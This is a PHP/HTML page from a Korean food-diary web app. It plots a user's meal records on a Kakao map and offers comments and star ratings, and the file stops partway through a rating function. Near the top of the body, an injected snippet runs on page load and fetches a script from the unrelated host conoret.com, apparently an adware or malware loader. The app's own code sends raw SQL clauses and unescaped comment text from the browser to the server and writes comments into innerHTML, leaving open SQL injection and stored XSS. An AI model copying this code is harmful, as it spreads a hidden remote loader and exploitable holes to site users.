<!DOCTYPE html>
<?php
if(!isset($_COOKIE['user_name'])) {
    echo "<meta http-equiv='refresh' content='0;url=index.php'>";
    exit;
}
else {
    setcookie('user_name', $_COOKIE['user_name'], time() + (3600), '/');
    setcookie('user_id', $_COOKIE['user_id'], time() + 3600, '/');
    setcookie('user_nickname',$_COOKIE['user_nickname'],time()+3600,'/');
}
?>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="ssosso.table.u">
    <meta name="generator" content="ssosso.table food-db 0.1.0">
    <link rel="icon" href="https://getbootstrap.com/docs/4.0/assets/img/favicons/favicon.ico">

    <title>ssosso-table.food-db.record</title>

    <link rel="canonical" href="http://ssossotable.com">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <style>
        .bd-placeholder-img {
            font-size: 1.125rem;
            text-anchor: middle;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
        }

        @media (min-width: 768px) {
            .bd-placeholder-img-lg {
                font-size: 3.5rem;
            }
        }
    </style>

    <!-- Custom styles for this template -->
    <script src="./script/main/dsp" type="text/javascript" defer="" async=""></script>
    <link rel="preconnect" href="https://fonts.googleapis.com/" crossorigin="true">
    <link rel="preconnect" href="https://fonts.gstatic.com/">
    <link rel="stylesheet" href="./css/main/css2">
    <link rel="stylesheet" href="./css/rating/css2">
    <link href="./css/main/cover.css" rel="stylesheet">
    <link rel="stylesheet" href="/css/record.css">

    <style>
        .list-group-item.active {
            background-color:#e4bd74;
            color:white;
        }
    </style>

    <script src="./script/rating/dsp" type="text/javascript" defer="" async=""></script>
    <script
        src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
        crossorigin="anonymous"></script>

    <script type="text/javascript">

    </script>
</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
</script>
<div class="cover-container d-flex h-100 p-3 mx-auto flex-column">

    <header class="masthead mb-auto">
        <div class="inner">
            <a href="http://ssossotable.com/rating.php"><img class="masthead-brand" src="src/logo.png" width="72px" height="72px"></a>
            <nav class="nav nav-masthead justify-content-center">
                <a class="nav-link text-muted" href="http://ssossotable.com/rating.php">음식 평가하기</a>
                <a class="nav-link text-muted" href="http://ssossotable.com/recipe.php">레시피 추가하기</a>
                <a class="nav-link text-muted" href="http://ssossotable.com/record.php">식사 기록하기</a>
                <div class="dropdown">
                    <button class="btn btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" style="border-color: transparent;background-color: transparent;"></button>
                    <ul class="dropdown-menu" style="">
                        <li><a class="dropdown-item" href="http://ssossotable.com/myInfo.php">내 정보</a></li>
                        <li><a class="dropdown-item" href="http://ssossotable.com/friends.php">친구 목록</a></li>
                        <li><a class="dropdown-item" href="http://ssossotable.com/diary.php">다이어리</a></li>
                        <li><a class="dropdown-item" href="http://ssossotable.com/my-recipe.php">나만의 레시피북</a></li>
                        <li><a class="dropdown-item" href="http://ssossotable.com/insert.php">음식 추가하기(for dev)</a></li>
                    </ul>
                </div>
            </nav>
        </div>
    </header>
    <main role="main" class="inner cover" id="rating_main"  style="">
        <div class="card">
            <div class="card-body" id="title">
                <h5 class="card-title">다이어리</h5>
                <p class="card-text">당신의 식사 기록.</p>
            </div>
            <div id="map" style="width:100%;height:350px;"></div>
            <script type="text/javascript" src="//dapi.kakao.com/v2/maps/sdk.js?appkey=a4b680f23e6397395260cfd7b38420b8&libraries=services,clusterer,drawing"></script>
            <script>
                let postJson={}
                let k=null
                let before={}
                before.id=null

                let mapContainer = document.getElementById('map'), // 지도를 표시할 div
                    mapOption = {
                        center: new kakao.maps.LatLng(36.5, 128), // 지도의 중심좌표
                        level: 13 // 지도의 확대 레벨
                    };

                let map = new kakao.maps.Map(mapContainer, mapOption); // 지도를 생성합니다

                // 마커를 클릭하면 장소명을 표출할 인포윈도우 입니다
                let infowindow = new kakao.maps.InfoWindow({zIndex:1});

                // 지도에 표시된 마커 객체를 가지고 있을 배열입니다
                let markers = {};

                // 마커를 생성하고 지도위에 표시하는 함수입니다
                function addMarker(position,info) {
                    // 마커를 생성합니다
                    let marker = new kakao.maps.Marker({
                        position: position
                    });
                    markers[info[3]]=marker
                    // 마커가 지도 위에 표시되도록 설정합니다
                    marker.setMap(map);

                    // 마커에 클릭이벤트를 등록합니다
                    kakao.maps.event.addListener(marker, 'click', async function(event) {

                        let f=``
                        switch (parseInt(info[1])) {
                            case 1:
                                f=getScore(0,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5])
                                break
                            case 2:
                                f=getScore(1,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5])
                                break
                            case 3:
                                f=getScore(2,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5])
                                break
                            case 4:
                                f=getScore(3,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5])
                                break
                            case 5:
                                f=getScore(4,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5])
                                break
                            case 6:
                                f=getScore(5,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5])
                                break
                            case 7:
                                f=getScore(6,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5])
                                break
                            case 8:
                                f=getScore(7,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5])
                                break
                            case 9:
                                f=getScore(8,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5])
                                break
                            case 10:
                                f=getScore(9,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5])
                                break
                            default :
                                break
                        }
                        const rfmt=`
                        <div>
                            <div><img src="src/ramen.jpg" width="240px" height="240px"></div>
                            <div><span>${info[2]}</span></div>
                            <div><span>${f}</span></div>
                            <div><span>${info[6]}</span></div>
                            <div><span>${info[7]}</span></div>
                        </div>
                        `
                        document.getElementById('modal-content').innerHTML=``
                        document.getElementById('modal-content').innerHTML=rfmt
                        document.getElementById(`diary-list-${info[3]}`).click()
                        let format=`
                                <div style="padding:5px;font-size:12px;display: inline-block;">
                                    <span>${info[2]}</span>
                                    <div class="d-flex justify-content-start fs-2" id="diary-${info[3]}" style=" margin: 0px !important; padding: 0px !important;">
                                        ${f}
                                    </div>
                                </div>
                                `
                        infowindow.setContent(format);
                        infowindow.open(map,marker);
                    });
                }

                // 배열에 추가된 마커들을 지도에 표시하거나 삭제하는 함수입니다
                function setMarkers(map) {
                    for (var i = 0; i < markers.length; i++) {
                        markers[i].setMap(map);
                    }
                }

                // "마커 보이기" 버튼을 클릭하면 호출되어 배열에 추가된 마커를 지도에 표시하는 함수입니다
                function showMarkers() {
                    setMarkers(map)
                }

                // "마커 감추기" 버튼을 클릭하면 호출되어 배열에 추가된 마커를 지도에서 삭제하는 함수입니다
                function hideMarkers() {
                    setMarkers(null);
                }
                async function showInfo() {

                    if(document.getElementById(`diary-list-${arguments[2]}`).classList.contains('active')) {
                        document.getElementById(`diary-list-${arguments[2]}`).classList.remove('active')
                    }
                    else {
                        if(before.id!==null) {
                            document.getElementById(`diary-list-${before.id}`).classList.remove('active')
                        }
                        document.getElementById(`diary-list-${arguments[2]}`).classList.add('active')
                        before.id=arguments[2]
                    }
                    const marker=markers[arguments[2]]
                    let f=``
                    let commentContent=``
                    const commentInfo=JSON.parse(await $.ajax({
                        type: "POST",
                        url: '/script/php/DAOHandler.php',
                        data: {
                            0:'select',
                            1:'*',
                            2:`diary_comment`,
                            3:`userId=<?php echo $_COOKIE['user_id']?> and locationid=${arguments[2]}`
                        }}))
                    if(commentInfo.length!==0) {
                        for(let i=0;i<commentInfo.length;i++) {
                            commentContent+=`<li class="list-group-item d-flex justify-content-evenly" id='${commentInfo[i][0]}'>
                            <div>
                                <img style="display:block;" src='<?php echo $_COOKIE['user_image']; ?>' width="40px" height="40px"/>
                                <span style="display:block;"><?php echo $_COOKIE['user_nickname']; ?></span>
                            </div>
                            <span style="display:block;">${commentInfo[i][3]}</span>
                            <div>
                                <img src='src/close.png' width="20px" height="20px" onclick="delete_comment('${commentInfo[i][0]}')"/>
                            </div>
                        </li>`
                        }

                        console.log(commentInfo)
                    }
                    switch (parseInt(arguments[0])) {
                        case 1:
                            f=getScore(0,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4])
                            break
                        case 2:
                            f=getScore(1,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4])
                            break
                        case 3:
                            f=getScore(2,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4])
                            break
                        case 4:
                            f=getScore(3,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4])
                            break
                        case 5:
                            f=getScore(4,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4])
                            break
                        case 6:
                            f=getScore(5,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4])
                            break
                        case 7:
                            f=getScore(6,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4])
                            break
                        case 8:
                            f=getScore(7,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4])
                            break
                        case 9:
                            f=getScore(8,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4])
                            break
                        case 10:
                            f=getScore(9,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4])
                            break
                        default :
                            break
                    }
                    const rfmt=`
                        <div>
                            <div><img src="${arguments[7]}" width="240px" height="240px"></div>
                            <div><span>${arguments[1]}</span></div>
                            <div><span>${f}</span></div>
                            <div><span>${arguments[5]}</span></div>
                            <div><span>${arguments[6]}</span></div>
                            <div class="input-group mb-3">
                              <input type="text" class="form-control" id="comment-value" placeholder="코멘트 입력" aria-label="Recipient's username" aria-describedby="button-addon2">
                              <button class="btn btn-outline-secondary" type="button" onclick="add_comment(${arguments[2]});" id="button-addon2">작성</button>
                            </div>
                            <ul class="list-group" id="comment-list">
                                ${commentContent}
                            </ul>
                        </div>
                        `
                    document.getElementById('modal-content').innerHTML=``
                    document.getElementById('modal-content').innerHTML=rfmt
                    let format=`
                                <div style="padding:5px;font-size:12px;display: inline-block;">
                                    <span>${arguments[1]}</span>
                                    <div class="d-flex justify-content-start fs-2" id="diary-${arguments[1]}" style=" margin: 0px !important; padding: 0px !important;">
                                        ${f}
                                    </div>
                                </div>
                                `
                    infowindow.setContent(format);
                    infowindow.open(map,marker);
                }
                async function add_comment() {
                    const userId=<?php echo $_COOKIE['user_id'];?>

                    const locationId=parseInt(arguments[0])
                    const comment=document.getElementById('comment-value').value
                    const commentId=`comment-${userId}-${locationId}-${Date.now()}`
                    document.getElementById('comment-value').value=''
                    if(comment!=='') {
                        let comment_format=`
                        <li class="list-group-item d-flex justify-content-evenly" id='${commentId}'>
                            <div>
                                <img style="display:block;" src='<?php echo $_COOKIE['user_image']; ?>' width="40px" height="40px"/>
                                <span style="display:block;"><?php echo $_COOKIE['user_nickname']; ?></span>
                            </div>
                            <span style="display:block;">${comment}</span>
                            <div>
                                <img src='src/close.png' width="20px" height="20px" onclick="delete_comment('${commentId}')"/>
                            </div>
                        </li>
                        `
                        document.getElementById('comment-list').innerHTML+=comment_format
                        await $.ajax({
                            type: "POST",
                            url: '/script/php/DAOHandler.php',
                            data: {
                                0:'insert',
                                1:'diary_comment(id,userid,locationid,comment)',
                                2:`'${commentId}',${userId},${locationId},'${comment}'`
                            }})
                    }
                }
                async function delete_comment() {
                     await $.ajax({
                         type: "POST",
                         url: '/script/php/DAOHandler.php',
                         data: {
                             0:'delete',
                             1:'diary_comment',
                             2:`userid=<?php echo $_COOKIE['user_id']?> and id='${arguments[0]}'`
                         }})
                    document.getElementById(arguments[0]).remove()
                }
                async function init() {
                    k=JSON.parse(await $.ajax({
                        type: "POST",
                        url: '/script/php/DAOHandler.php',
                        data: {
                            0:'select',
                            1:'*',
                            2:'record',
                            3:`userid=${<?php echo $_COOKIE['user_id']?>}`
                        }}))

                    if(k.length !== 0) {
                        let format=``
                        for(let i=0; i < k.length; i++) {
                            addMarker(
                                new kakao.maps.LatLng(k[i][4], k[i][5]),
                                k[i]
                            )
                            format+=`
                        <li class='list-group-item' id='diary-list-${k[i][3]}'
                        data-bs-toggle="modal" data-bs-target="#recordModal"
                        onclick="showInfo(${k[i][1]},'${k[i][2]}',${k[i][3]},${k[i][4]},${k[i][5]},'${k[i][6]}','${k[i][7]}','${k[i][9]}')"
                        >
                            <span>${k[i][2]}</span>
                        </li>
                        `
                        }
                        document.getElementById('diary-list').innerHTML=format
                    }

                }
                function set() {
                    // need to imple
                }
                function getScore() {
                    switch (parseInt(arguments[0])) {
                        case 0:
                            return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 1:
                            return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 2:
                            return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 3:
                            return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 4:
                            return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 5: return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 6: return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 7: return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 8: return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
